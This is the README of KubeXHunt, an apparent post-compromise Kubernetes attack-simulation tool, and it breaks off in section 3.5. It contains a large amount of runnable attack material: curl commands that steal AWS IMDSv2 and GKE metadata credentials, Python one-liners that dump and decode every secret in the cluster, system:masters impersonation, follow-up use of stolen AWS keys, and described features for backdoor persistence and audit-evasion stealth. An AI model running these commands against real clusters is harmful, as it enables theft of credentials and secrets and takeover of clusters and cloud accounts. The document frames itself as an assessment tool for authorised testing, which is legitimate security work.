<div align="center">

> ## 🛠️ KubeXHunt — Post-Compromise Kubernetes Attack Simulation Framework

> KubeXHunt is an open-source **post-compromise Kubernetes security assessment framework** designed to simulate real-world attacker behavior from inside a compromised pod.
>
> Instead of just scanning for misconfigurations, KubeXHunt **demonstrates actual impact** by validating access, exploiting weaknesses, and chaining findings into complete attack paths.
>
> 💡 Think: *BloodHound for Kubernetes + post-exploitation automation*

> **Drop this tool onto any compromised pod and run a full automated assessment of the entire cluster.**
> Zero external dependencies — pure Python 3 stdlib only. Runs on any pod with Python 3.6+.

</div>

---

> Credits to **[Chandrapal Badshah](https://github.com/0xbadshah)** for providing exceptional training on Kubernetes Security, which significantly contributed to the development of this tool and deepened my understanding of Kubernetes security practices.

> Special thanks to **[Payatu](https://github.com/payatu)** for sponsoring and providing access to this training, enabling the research and development behind KubeXHunt.

---

> [!IMPORTANT]
> **Starting Point:** You have Remote Code Execution (RCE) inside a compromised pod.
> All commands are executed **from inside that pod** unless stated otherwise.
> **Philosophy:** Demonstrate impact without destroying — read, enumerate, prove, document.

---

## 🤔 Why KubeXHunt?

Most Kubernetes tools answer:
> “What is misconfigured?”

KubeXHunt answers:
> **“What can an attacker actually do with this?”**

| Traditional Tools | KubeXHunt |
|------------------|----------|
| Misconfiguration scanning | Post-compromise attack simulation |
| Static analysis | Real API access validation |
| Flat findings list | Attack path chaining |
| Assumes risk | **Proves impact** |

---

💥 In under a minute, KubeXHunt can answer:

- Can I become **cluster-admin**?
- Can I reach **cloud credentials (IMDS / Workload Identity)**?
- Can I escape to the **node / host**?
- Can I pivot across **namespaces / workloads**?

---

## ⚖️ Comparison with Other Tools

| Tool | Focus | Limitation |
|------|------|-----------|
| kube-bench | CIS compliance | No exploitation |
| kube-hunter | External scanning | Limited post-exploitation |
| kubescape | Misconfig scanning | No attack chaining |
| **KubeXHunt** | 🔥 Post-compromise attack simulation | Shows real impact |

---

<div align="center">

[![Tool](https://img.shields.io/badge/Tool-KubeXHunt-red?style=for-the-badge&logo=python)](.)
[![Version](https://img.shields.io/badge/Version-1.2.0-purple?style=for-the-badge)](.)
[![Language](https://img.shields.io/badge/Language-Python%203-blue?style=for-the-badge&logo=python)](.)
[![Dependencies](https://img.shields.io/badge/Dependencies-None-green?style=for-the-badge)](.)
[![Phases](https://img.shields.io/badge/Phases-27%20(0--26)-orange?style=for-the-badge)](.)
[![Author](https://img.shields.io/badge/Author-Mayank%20Choubey-orange?style=for-the-badge)](.)

</div>

---

### ⬇️ Download & Run

```bash

git clone https://github.com/mr-xhunt/kubeXhunt.git
cd kubeXhunt

# Alternatively directly download the tool on the compromised pod
wget https://raw.githubusercontent.com/mr-xhunt/kubeXhunt/refs/heads/main/kubexhunt.py

# Run full assessment
python3 kubexhunt.py
```

---

### 🚀 Usage

```
python3 kubexhunt.py [OPTIONS]

Options:
  --phase N [N ...]     Run specific phase(s) only (0-26)
  --fast                Skip slow checks (port scanning, DNS brute force)
  --stealth 0|1|2       Stealth level: 0=off  1=jitter+kubectl UA  2=full evasion
  --no-mutate           Skip all mutating API calls (safe for production clusters)
  --output FILE         Save report (.json / .html / .sarif / .txt)
  --diff PREV.json      Compare with previous scan — CI/CD gate mode
  --proxy URL           Route API calls through Burp Suite or HTTP proxy
  --exclude-phase N     Skip specific phase(s)
  --phase-list          Print all 27 phases and exit
  --no-color            Disable colored output (for log files / piping)
  --kubectl-only        Only install kubectl and exit
  -h, --help            Show help
```

**Examples:**

```bash
# Full assessment — all 27 phases
python3 kubexhunt.py

# Target specific phases
python3 kubexhunt.py --phase 3 7 15 16

# Read-only silent mode — safe for production
python3 kubexhunt.py --stealth 2 --no-mutate

# Save HTML report (self-contained, dark theme)
python3 kubexhunt.py --output report.html

# Save SARIF for GitHub Code Scanning / DefectDojo
python3 kubexhunt.py --output report.sarif

# Save JSON for diff comparison
python3 kubexhunt.py --output report.json

# CI/CD mode — fail pipeline on new CRITICAL/HIGH
python3 kubexhunt.py --diff previous.json --output new.json

# Route all API calls through Burp
python3 kubexhunt.py --proxy http://127.0.0.1:8080

# Skip slow DNS brute-force and port scanning
python3 kubexhunt.py --fast

# Skip supply chain and cloud phases
python3 kubexhunt.py --exclude-phase 9 10 11 20

# List all phases with descriptions
python3 kubexhunt.py --phase-list
```

---

### ⚡ Quick One-Liner (no file save)

```bash
# Run directly in memory — nothing written to disk
curl -s https://raw.githubusercontent.com/mr-xhunt/kubeXhunt/refs/heads/main/kubexhunt.py | python3 - --fast
```

---

## 🧠 How It Works

KubeXHunt follows a real attacker workflow:

Compromised Pod
     ↓
Credential Discovery (SA tokens, env, /proc)
     ↓
Kubernetes API Exploitation (RBAC, secrets, workloads)
     ↓
Lateral Movement (services, DNS, endpoints)
     ↓
Privilege Escalation (privileged pods, host access)
     ↓
Node Compromise
     ↓
Cloud Pivot (IMDS / IAM / Workload Identity)
     ↓
⚔ Attack Path Generation


👉 Every step is **validated in real-time**, not assumed.

---

### 📋 Phases Covered (v1.2.0 — 27 Phases)

| Phase | Name | What It Checks |
|-------|------|----------------|
| `0` | Setup & kubectl Install | Auto-installs kubectl, searches host filesystem for existing binary, auto-configures in-cluster kubeconfig from SA token, detects cloud (AWS/GKE/Azure/OpenShift), scores token privilege |
| `1` | Pod & Container Recon | Capabilities (CapEff), seccomp, AppArmor, privileged, hostPID, hostNetwork, block devices, runtime socket, container runtime detection (containerd/docker/cri-o via host filesystem + kubectl) |
| `2` | Cloud Metadata & IAM | IMDSv1/v2 credential theft, GKE OAuth token, node SA scopes, IRSA token abuse |
| `3` | K8s API & RBAC | SA permissions, secret theft, wildcard RBAC, impersonation, bind/escalate/TokenRequest abuse, cluster-admin bindings |
| `4` | Network & Lateral Movement | Service discovery, DNS brute-force + SRV, recursive endpoint walking (advertises own endpoints), port scan, Istio/mTLS awareness, NetworkPolicy gaps, service mesh CRD detection, sniffing |
| `5` | Container Escape | nsenter, chroot, Docker/containerd socket, cgroup v1 release_agent, user namespace unshare |
| `6` | Node Compromise | Kubelet certs, projected volume SA token decode (sub field), all stolen tokens permission-tested, token privilege ranking (0-100), SSH keys, kubeconfig files |
| `7` | Cluster Escalation | Privileged pod creation, ClusterRoleBinding escalation, webhook failurePolicy bypass, etcd encryption check, controller hijacking |
| `8` | Persistence | Backdoor SA in kube-system, DaemonSet on all nodes, CronJob persistence, sidecar injection |
| `9` | Supply Chain | Image signing (webhook + Kyverno CRD fallback), registry credential pivot (catalog API probe), PSS enforcement, Kyverno v1/v2 policies (403=installed), admission plugins |
| `10` | EKS-Specific | aws-auth read/write, IRSA tokens, node IAM role, account enumeration |
| `11` | GKE-Specific | Workload Identity, node SA scopes, legacy metadata endpoint, Dashboard, project enumeration |
| `12` | Runtime Security | Multi-method detection: pod names + CRD probes + filesystem (403=installed), Tetragon TracingPolicies, Kyverno, Istio PeerAuthentication, exec-from-/tmp enforcement probe |
| `13` | Secrets & Data | Env var credential scan, mounted secret files, app config credential grep |
| `14` | DoS & Resource Limits | cgroup v1/v2 memory/CPU limits, ResourceQuota, LimitRange, audit logging (self-managed + EKS CloudWatch detection) |
| `15` | Cluster Intel & CVEs ⭐ | K8s version → real version-gated CVE comparison (no blanket fire), runc CVE-2024-21626 via containerd version mapping, kernel CVE range check (Linux only), API server public IP check, worker node public IP check, node enumeration with 5-method IP fallback |
| `16` | Kubelet Exploitation ⭐ | Real node IPs via `_get_node_ips()` (kubectl/kubelet config/fib_trie/hostname -I/Downward API), port 10255 anonymous, port 10250 auth bypass, /pods credential harvest |
| `17` | etcd Exposure ⭐ | Real node IPs, port 2379/2380 probe, no-TLS access, mTLS bypass, v3 keys endpoint secret dump |
| `18` | Helm & App Secrets ⭐ | Helm release secret decode (base64+gzip), imagePullSecrets cluster-wide, app filesystem credential scan |
| `19` | /proc Credential Harvest ⭐ | /proc/self/environ, co-process environ (cgroup-deduplicated from hostPID), hostPID host process scanning (kubelet/etcd/containerd only), Redis/ArgoCD token capture, Downward API node name extraction |
| `20` | Azure AKS ⭐ | IMDS instance info, Managed Identity token theft (4 resources), Workload Identity, azure.json SP creds, AAD Pod Identity NMI |
| `21` | OpenShift / OKD ⭐ | SCC enumeration, current pod SCC, route enumeration, internal registry creds, OAuth endpoint, project enumeration |
| `22` | Advanced Red Team ⭐ | SA token audience abuse, DNS poisoning via NET_ADMIN/NET_RAW, controller hijacking, token scope comparison |
| `23` | Attack Chain Simulation ⭐ | 4 real-world chains: Tesla-style IMDS breach, RBAC→Node, token theft→wildcard RBAC, webhook bypass→node escape |
| `24` | Stealth & Evasion ⭐ | Audit log impact classification, --no-mutate shows PASS (zero write operations), runtime tool presence from CTX, stealth level recommendations |
| `25` | Network Plugin & Misc ⭐ | CNI detection (Calico/Cilium/Weave/Flannel), kube-proxy mode, cluster-wide automount audit, default SA token check |
| `26` | Diff & Reporting ⭐ | JSON diff vs previous scan, new/fixed/changed findings, CI/CD exit code 1 on new CRITICAL/HIGH |

> ⭐ = New in v1.2.0

---

### 📊 Sample Output

```
╔══════════════════════════════════════════════════════════════════════════════════╗
║   ██╗  ██╗██╗   ██╗██████╗ ███████╗██╗  ██╗██╗  ██╗██╗   ██╗███╗   ██╗████████╗  ║
║   ...                                                                            ║
║   Kubernetes Security Assessment Tool  v1.2.0                                    ║
║   Starting from a Compromised Pod → Full Cluster Audit + Attack Path Discovery   ║
║   Author: Mayank Choubey                                                         ║
╚══════════════════════════════════════════════════════════════════════════════════╝

──────────────────────────────────────────────────────────────────────
  PHASE  2 │ Cloud Metadata & IAM Credentials
  IMDS credential theft, GKE metadata, OAuth token exfiltration
──────────────────────────────────────────────────────────────────────

  ▸ AWS IMDSv2 Credential Theft
  🔴 [CRITICAL] AWS IAM credentials stolen via IMDSv2
  │          Role: eks-node-group-role | KeyId: ASIA...truncated...
  │          Expires: 2026-03-18T14:30:00Z
  │          export AWS_ACCESS_KEY_ID=ASIA... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
  │ ⚑ Fix:  Block 169.254.169.254/32 via NetworkPolicy

──────────────────────────────────────────────────────────────────────
  PHASE 23 │ Real-World Attack Chain Simulation
──────────────────────────────────────────────────────────────────────

  ▸ Chain 2: RBAC Misconfiguration → Privileged Pod → Node Root
  → ✓ Step 1: Can list/read secrets (RBAC misconfiguration)
  → ✓ Step 2: Can create privileged pods
  → ✓ Step 3: Privileged pod → hostPath: / → node root
  🔴 [CRITICAL] Attack Chain COMPLETE: RBAC → Privileged Pod → Node Root
  │          Path: Over-permissive RBAC → Create privileged pod with hostPath: /
  │          → chroot node → steal all kubelet tokens → pivot to every namespace

══════════════════════════════════════════════════════════════════════
  KUBEXHUNT v1.2.0 — FINAL ASSESSMENT REPORT
══════════════════════════════════════════════════════════════════════

  🔴 CRITICAL :    5
  🟠 HIGH     :   11
  🟡 MEDIUM   :    4
  🔵 LOW      :    2
  ✅ PASS     :   24
  ──────────────────────────────────────────
  Total Issues:   22

  Overall Risk: 🔴 CRITICAL RISK — Immediate action required

  ⚔  ATTACK PATH DISCOVERY
  Attack Path #1  (CRITICAL)
  Compromised Pod
     ↓ Privileged container → nsenter -t 1 → host bash
  Node Root
     ↓ Stolen SA tokens → wildcard RBAC
  Permanent Cluster Admin
```

---

### 🔐 Stealth Modes

| Level | Flag | Behavior |
|-------|------|----------|
| 0 | _(default)_ | Full speed, Python urllib User-Agent, no delays |
| 1 | `--stealth 1` | kubectl User-Agent spoofing, 0.3–2s timing jitter |
| 2 | `--stealth 2` | Read-only inference, batched API calls, maximum jitter, fully evasive |

Combined with `--no-mutate` (skips all POST/PATCH/DELETE calls — infers from RBAC only), stealth level 2 generates zero mutating audit log entries and blends into normal kubectl traffic.

---

### 📤 Report Formats

| Format | Flag | Use Case |
|--------|------|----------|
| HTML | `--output report.html` | Self-contained dark-theme report, attack path diagrams, collapsible phase sections |
| JSON | `--output report.json` | Machine-readable, includes attack_paths + token_scores + summary |
| SARIF | `--output report.sarif` | SARIF 2.1.0 — GitHub Code Scanning, DefectDojo, any SAST pipeline |
| TXT | `--output report.txt` | Plain text, log-shippable, CI/CD friendly |

---

### ⚔ Attack Path Engine

KubeXHunt automatically builds a BloodHound-style attack graph across all phases. If a chain of vulnerabilities can lead from pod compromise to cluster-admin or cloud account takeover, it is printed at the end of the report as a complete step-by-step path.

**Four built-in real-world chain simulations (Phase 23):**

| Chain | Steps | Based On |
|-------|-------|----------|
| Pod RCE → IMDS → Cloud Account | SA token → cloud IMDS → IAM credentials → full cloud access | Tesla cryptomining breach (2018) |
| RBAC → Privileged Pod → Node Root | Over-permissive RBAC → pod create → hostPath: / → chroot | Most common K8s privilege escalation |
| Token Theft → Wildcard RBAC → Cluster Admin | hostPath mount → steal SA tokens → find wildcard → backdoor CRB | Real-world cluster takeovers |
| Webhook Bypass → Policy Bypass → Node Escape | failurePolicy=Ignore + unreachable service → policy bypass | Silent Kyverno/OPA bypass |

---

### 🏆 Token Privilege Scoring

Every SA token encountered (current pod + any stolen tokens) is scored 0–100 based on demonstrated API access:

```
  Token Privilege Ranking
  [100/100] ██████████ kube-system/default (stolen)
  [ 45/100] ████░░░░░░ payments/payment-api
  [ 10/100] █░░░░░░░░░ default/webapp

  Best pivot token: kube-system/default (score 100/100)
  Abilities: list all secrets | list namespaces | list clusterrolebindings | ...
```

---

### 🔄 CI/CD Diff Mode

Compare two scans and automatically fail the pipeline if new CRITICAL or HIGH findings appear:

```bash
# Baseline scan
python3 kubexhunt.py --output baseline.json

# After a cluster change — diff against baseline
python3 kubexhunt.py --diff baseline.json --output new.json
# → exits with code 1 if new CRITICAL/HIGH found
```

Output shows new findings (regressions), fixed findings (improvements), and severity changes — allowing automated pipeline gating without manual review.

---

## What Actually Happens — Phase-by-Phase Checklist

## 📋 Table of Contents

| # | Phase | Focus |
|---|-------|-------|
| [0](#-phase-0-pre-assessment-setup) | Pre-Assessment Setup | Confirm RCE, grab SA token, auto-configure kubectl in-cluster |
| [1](#-phase-1-pod--container-recon) | Pod & Container Recon | Capabilities, mounts, hostPID, hostNetwork |
| [2](#-phase-2-cloud-metadata--iam-credentials) | Cloud Metadata & IAM | AWS IMDS, GKE metadata, credential theft |
| [3](#-phase-3-kubernetes-api-enumeration-via-rbac) | K8s API Enumeration | RBAC exploitation, secret theft, cluster map |
| [4](#-phase-4-network-recon--lateral-movement) | Network Recon & Lateral Movement | Service discovery, port scan, recursive endpoint walk, Istio-aware pivot |
| [5](#-phase-5-container-escape) | Container Escape | nsenter, chroot, socket, cgroup |
| [6](#-phase-6-node-level-compromise) | Node-Level Compromise | Kubelet certs, projected token decode, full permission test on all stolen tokens |
| [7](#-phase-7-cluster-wide-privilege-escalation) | Cluster Privilege Escalation | Cluster-admin, privileged pods, etcd |
| [8](#-phase-8-persistence-techniques) | Persistence | Backdoor SA, DaemonSet, sidecar injection |
| [9](#-phase-9-supply-chain--admission-control-gaps) | Supply Chain & Admission | Image signing (webhook + Kyverno CRD fallback), registry catalog pivot, PSS, Kyverno v1/v2 |
| [10](#-phase-10-eks-specific-tests) | EKS-Specific | aws-auth, IRSA, node IAM, CloudWatch |
| [11](#-phase-11-gke-specific-tests) | GKE-Specific | Workload Identity, legacy metadata, scopes |
| [12](#-phase-12-runtime-security-gaps) | Runtime Security Gaps | Tetragon/Falco/Kyverno/Istio via pods + CRDs + filesystem, TracingPolicy, exec-from-/tmp |
| [13](#-phase-13-secrets--sensitive-data) | Secrets & Sensitive Data | Env vars, mounted files, app configs |
| [14](#-phase-14-dos--resource-exhaustion-proof) | DoS & Resource Exhaustion | cgroup v1/v2 limits, ResourceQuota, LimitRange, audit logging (self-managed + EKS CloudWatch) |
| [15](#-phase-15-cluster-intelligence--cve-detection) | Cluster Intel & CVEs ⭐ | Real CVE version comparison, runc version check, API server public IP, worker node public IPs, node enum with 5-method fallback |
| [16](#-phase-16-kubelet-exploitation) | Kubelet Exploitation ⭐ | Real node IP via `_get_node_ips()`, anonymous kubelet, /pods credential harvest |
| [17](#-phase-17-etcd-exposure) | etcd Exposure ⭐ | Real node IP probing, unauthenticated etcd, TLS bypass, secret dump |
| [18](#-phase-18-helm--application-secrets) | Helm & App Secrets ⭐ | Helm release decode, imagePullSecrets |
| [19](#-phase-19-proc-credential-harvesting) | /proc Harvesting ⭐ | Process env harvest, cgroup-based pod PID dedup, hostPID host-only scanning, Redis/ArgoCD capture |
| [20](#-phase-20-azure-aks) | Azure AKS ⭐ | IMDS, Managed Identity, Workload Identity |
| [21](#-phase-21-openshift--okd) | OpenShift / OKD ⭐ | SCCs, routes, OAuth, registry |
| [22](#-phase-22-advanced-red-team-techniques) | Advanced Red Team ⭐ | Token audience, DNS poisoning, controller hijack |
| [23](#-phase-23-real-world-attack-chain-simulation) | Attack Chain Simulation ⭐ | 4 complete attack chain proofs |
| [24](#-phase-24-stealth--evasion-analysis) | Stealth & Evasion ⭐ | Audit impact classification, --no-mutate PASS, runtime tool detection from CTX |
| [25](#-phase-25-network-plugin--misc) | Network Plugin & Misc ⭐ | CNI, kube-proxy, SA token audit |
| [26](#-phase-26-diff--reporting) | Diff & Reporting ⭐ | CI/CD diff, regression detection |
| [↓](#-findings-summary-template) | Findings Template | Severity matrix, EKS vs GKE vs Azure vs OpenShift table |

---

## Severity Legend

| Badge | Level | Action |
|-------|-------|--------|
| 🔴 **CRITICAL** | Immediate cluster or cloud account compromise | Stop assessment, report immediately |
| 🟠 **HIGH** | Significant privilege escalation or data exposure | Report same day |
| 🟡 **MEDIUM** | Meaningful security gap, requires chaining | Report in assessment |
| 🔵 **LOW** | Defence-in-depth gap, minimal direct impact | Include in recommendations |

---

## 🔧 Phase 0: Pre-Assessment Setup

> [!NOTE]
> Run this first. Sets up variables used throughout every other phase.

```bash
# Confirm execution context
id && whoami && hostname
uname -a
cat /etc/os-release

# Check what we can see
env | sort
cat /proc/self/status | grep -E "^Name|^Pid|^PPid|^Cap"

# Grab service account credentials (used in every Phase 3+ test)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
API="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Namespace : $NS"
echo "Token     : $([ -n "$TOKEN" ] && echo "✅ PRESENT" || echo "❌ MISSING")"
echo "API       : $API"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Auto-configure kubectl from SA token if kubeconfig is empty
# kubectl inside a pod has no kubeconfig by default — every command fails
# with "couldn't get current server API group list" without this step
kubectl config view | grep -q "clusters: null" && {
  echo "Configuring kubectl from SA token..."
  kubectl config set-cluster in-cluster     --server=$API     --certificate-authority=$CACERT
  kubectl config set-credentials $NS-sa --token=$TOKEN
  kubectl config set-context default     --cluster=in-cluster     --user=$NS-sa     --namespace=$NS
  kubectl config use-context default
  echo "✅ kubectl configured with in-cluster credentials"
}
```

<details>
<summary><b>📌 Expected Output (what to look for)</b></summary>

- `uid=0(root)` → running as root inside container
- `CapEff: 0000003fffffffff` → has capabilities
- `Token: ✅ PRESENT` → can call Kubernetes API
- Namespace other than `default` → tells you what workload you're in

</details>

---

## 🔍 Phase 1: Pod & Container Recon

### 1.1 Capabilities Check

> 🔴 **CRITICAL if CapEff = `ffffffffffffffff`** — full kernel capabilities, equivalent to root on node

```bash
# Full capability dump
cat /proc/self/status | grep -E "^Cap(Eff|Prm|Inh|Bnd|Amb):"

# Human-readable decode (if capsh available)
capsh --decode=$(cat /proc/self/status | grep CapEff | awk '{print $2}')
```

| CapEff Value | Meaning | Severity |
|---|---|---|
| `0000000000000000` | No capabilities | ✅ Hardened |
| `00000000a80425fb` | Default container caps | 🔵 Normal |
| `0000003fffffffff` | Most caps present | 🟠 HIGH |
| `ffffffffffffffff` | ALL caps — fully privileged | 🔴 CRITICAL |

---

### 1.2 Privileged Container Check

> 🔴 **CRITICAL** — privileged = root on node with full kernel access

```bash
# seccomp status: 0 = disabled
cat /proc/self/status | grep -i "seccomp"

# Raw disk / memory devices
ls -la /dev/sda /dev/nvme0n1 2>/dev/null && echo "🔴 RAW DISK ACCESSIBLE"
ls -la /dev/mem 2>/dev/null             && echo "🔴 RAW MEMORY ACCESSIBLE"
ls /sys/kernel/debug 2>/dev/null        && echo "🟠 KERNEL DEBUG ACCESSIBLE"
```

---

### 1.3 Filesystem & Mount Analysis

> 🔴 **CRITICAL if host filesystem mounted** — read /etc/shadow, kubelet certs, SSH keys

```bash
# What is mounted?
cat /proc/mounts | grep -v "overlay\|proc\|sys\|dev\|tmpfs\|cgroup"

# Is root filesystem read-only?
touch /test-$(date +%s) 2>&1 | grep -q "Read-only" && \
  echo "✅ Read-only filesystem" || echo "🟡 Writable root filesystem"

# Host filesystem check
for mountpoint in /host /hostfs /node /rootfs /mnt/host; do
  [ -d "$mountpoint" ] && ls "$mountpoint/etc" 2>/dev/null && \
    echo "🔴 HOST FILESYSTEM MOUNTED AT: $mountpoint"
done

# Find ALL writable directories
find / -writable -type d 2>/dev/null | grep -v "proc\|sys\|dev\|run\|tmp" | head -20
```

---

### 1.4 hostPID & hostNetwork Check

> 🔴 **CRITICAL** — hostPID allows nsenter escape; hostNetwork exposes node services

```bash
# hostPID: PID 1 = systemd/init means we see the HOST process tree
echo "PID 1 is: $(cat /proc/1/comm)"
[ "$(cat /proc/1/comm)" = "systemd" ] && echo "🔴 hostPID ENABLED" || echo "✅ Isolated PID namespace"

# hostNetwork: can we reach node-only services?
curl -s --max-time 3 http://localhost:10255/pods 2>/dev/null | \
  python3 -c "import sys,json; d=json.load(sys.stdin); print(f'🔴 KUBELET READ-ONLY EXPOSED — {len(d.get(\"items\",[]))} pods')" \
  2>/dev/null || echo "✅ Kubelet 10255 not reachable"

curl -s --max-time 3 https://localhost:10250/pods -k 2>/dev/null | head -2 && \
  echo "🔴 KUBELET AUTHENTICATED API 10250 REACHABLE"
```

---

## ☁️ Phase 2: Cloud Metadata & IAM Credentials

### 2.1 AWS IMDSv1 — No Token Required (Legacy)

> 🔴 **CRITICAL** — zero authentication required

```bash
curl -s --max-time 5 http://169.254.169.254/latest/meta-data/ 2>/dev/null && \
  echo "🔴 IMDSv1 ACCESSIBLE — NO AUTH REQUIRED" || \
  echo "✅ IMDSv1 blocked or not AWS"
```

---

### 2.2 AWS IMDSv2 — Full Credential Theft

> 🔴 **CRITICAL if reachable** — temporary IAM credentials for the node role

```bash
# Step 1: Get session token
IMDS_TOKEN=$(curl -s -X PUT \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  --max-time 5 \
  http://169.254.169.254/latest/api/token 2>/dev/null)

echo "IMDS reachable: $([ -n "$IMDS_TOKEN" ] && echo "🔴 YES — CREDENTIALS AT RISK" || echo "✅ BLOCKED")"

# Step 2: Get attached IAM role
ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
echo "IAM Role: $ROLE"

# Step 3: Steal credentials
curl -s -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE 2>/dev/null | \
  python3 -m json.tool

# Step 4: Instance identity (account ID, region)
curl -s -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" \
  http://169.254.169.254/latest/dynamic/instance-identity/document 2>/dev/null | \
  grep -E "accountId|region|instanceType"
```

<details>
<summary><b>🔴 Using Stolen AWS Credentials (from attacker machine)</b></summary>

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Who am I?
aws sts get-caller-identity

# Enumerate permissions
aws iam list-attached-role-policies --role-name <role-name>

# ECR images
aws ecr describe-repositories
aws ecr list-images --repository-name <repo>

# EKS cluster info
aws eks list-clusters
aws eks describe-cluster --name <cluster>

# S3, Secrets Manager, SSM
aws s3 ls
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id <name>
aws ssm get-parameter --name <name> --with-decryption
```

</details>

---

### 2.3 GKE Metadata Server

> 🔴 **CRITICAL if cloud-platform scope** — full GCP API access

```bash
# GKE metadata
curl -s -H "Metadata-Flavor: Google" --max-time 5 \
  http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null && \
  echo "🔴 GKE METADATA ACCESSIBLE" || echo "✅ Blocked or not GKE"

# Steal OAuth2 token
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null

# Node scopes (cloud-platform = full GCP access)
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" 2>/dev/null

# Legacy endpoint — no header required
curl -s --max-time 5 \
  http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token \
  2>/dev/null && echo "🔴 LEGACY GKE METADATA — NO AUTH REQUIRED"
```

---

## 🔑 Phase 3: Kubernetes API Enumeration via RBAC

### 3.1 Check What the Service Account Can Do

> 🔴 **CRITICAL if wildcard permissions**

```bash
# Self-subject rules review — what can OUR token do?
curl -sk -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -X POST \
  $API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"$NS\"}}" \
  | python3 -m json.tool 2>/dev/null

# Can we list secrets?
RESULT=$(curl -sk -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces/$NS/secrets)
echo "List secrets in $NS: $([ "$RESULT" = "200" ] && echo "🔴 ALLOWED" || echo "✅ DENIED ($RESULT)")"

# Cluster-wide?
RESULT=$(curl -sk -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer $TOKEN" $API/api/v1/secrets)
echo "List ALL secrets cluster-wide: $([ "$RESULT" = "200" ] && echo "🔴 ALLOWED" || echo "✅ DENIED ($RESULT)")"
```

---

### 3.2 Dangerous Verb Check — bind / escalate / impersonate

> 🔴 **CRITICAL** — these verbs allow direct privilege escalation without creating resources

```bash
# Test impersonation as system:admin
curl -sk -H "Authorization: Bearer $TOKEN" \
  -H "Impersonate-User: system:admin" \
  -H "Impersonate-Group: system:masters" \
  $API/api/v1/namespaces | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    print(f'🔴 IMPERSONATION ACCEPTED — {len(d.get(\"items\",[]))} namespaces visible as system:admin')
except:
    print('✅ Impersonation rejected')
" 2>/dev/null
```

---

### 3.3 Secret Enumeration & Exfiltration

> 🔴 **CRITICAL** — database passwords, API keys, TLS certs, registry credentials

```bash
# List secrets with names
curl -sk -H "Authorization: Bearer $TOKEN" \
  $API/api/v1/namespaces/$NS/secrets | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
for s in d.get('items', []):
    print(f'  📦 {s[\"metadata\"][\"name\"]} (type: {s.get(\"type\",\"Opaque\")})')
"

# Decode and read a specific secret
curl -sk -H "Authorization: Bearer $TOKEN" \
  $API/api/v1/namespaces/$NS/secrets/<SECRET-NAME> | \
  python3 -c "
import sys, json, base64
d = json.load(sys.stdin)
print(f'Secret: {d[\"metadata\"][\"name\"]}')
for k, v in d.get('data', {}).items():
    try:
        decoded = base64.b64decode(v).decode()
        print(f'  🔑 {k}: {decoded}')
    except:
        print(f'  🔑 {k}: <binary data>')
"

# Dump ALL secrets cluster-wide (if permitted)
curl -sk -H "Authorization: Bearer $TOKEN" $API/api/v1/secrets | \
  python3 -c "
import sys, json, base64
d = json.load(sys.stdin)
for item in d.get('items', []):
    ns = item['metadata']['namespace']
    name = item['metadata']['name']
    print(f'\n━━━ {ns}/{name} ━━━')
    for k, v in item.get('data', {}).items():
        try:
            decoded = base64.b64decode(v).decode()
            print(f'  {k}: {decoded[:120]}')
        except:
            print(f'  {k}: <binary>')
"
```

---

### 3.4 Full Cluster Enumeration

```bash
# All pods — build infrastructure map
curl -sk -H "Authorization: Bearer $TOKEN" $API/api/v1/pods | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
print(f'Total pods: {len(d.get(\"items\",[]))}')
for p in d.get('items', []):
    ns = p['metadata']['namespace']
    name = p['metadata']['name']
    node = p.get('spec', {}).get('nodeName', '?')
    status = p.get('status', {}).get('phase', '?')
    print(f'  {ns:20} {name:40} node={node} [{status}]')
"

# All services
curl -sk -H "Authorization: Bearer $TOKEN" $API/api/v1/services | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
for s in d.get('items', []):
    ns = s['metadata']['namespace']
    name = s['metadata']['name']
    ports = [str(p.get('port','?')) for p in s.get('spec',{}).get('ports',[])]
    cip = s.get('spec',{}).get('clusterIP','')
    print(f'  {ns:20} {name:30} {cip:16} ports={\"|\".join(ports)}')
"

# Find cluster-admin bindings
curl -sk -H "Authorization: Bearer $TOKEN" \
  $API/apis/rbac.authorization.k8s.io/v1/clusterrolebindings | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
for crb in d.get('items', []):
    role = crb.get('roleRef', {}).get('name', '')
    if role in ['cluster-admin', 'admin', 'edit']:
        print(f'\n🔴 POWERFUL BINDING: {crb[\"metadata\"][\"name\"]} → {role}')
        for s in crb.get('subjects', []):
            print(f'   Subject: {s.get(\"kind\")} {s.get(\"namespace\",\"\")}/{s.get(\"name\")}')
"
```

---

### 3.5 Create Resources (Prove Create Permissions)

> 🔴 **CRITICAL if pod creation succeeds**

```bash
# Test pod creation
